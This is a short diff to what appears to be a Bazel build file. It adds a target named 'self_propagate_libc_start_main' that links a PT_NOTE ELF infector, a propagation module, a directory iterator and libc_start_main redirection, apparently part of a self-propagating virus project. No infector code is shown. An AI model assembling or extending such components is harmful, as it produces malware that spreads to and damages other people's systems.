@@ -26,3 +26,16 @@ cc_nostdlib_binary(
         "//redirection:libc_start_main",
     ],
 )
+
+cc_nostdlib_binary(
+    name = "self_propagate_libc_start_main",
+    srcs = ["self_propagate_libc_start_main.cc"],
+    allow_rodata_merging = True,
+    deps = [
+        "//common:directory_iterator",
+        "//common:macros",
+        "//infector:pt_note_infector",
+        "//propagation:propagate",
+        "//redirection:libc_start_main",
+    ],
+)
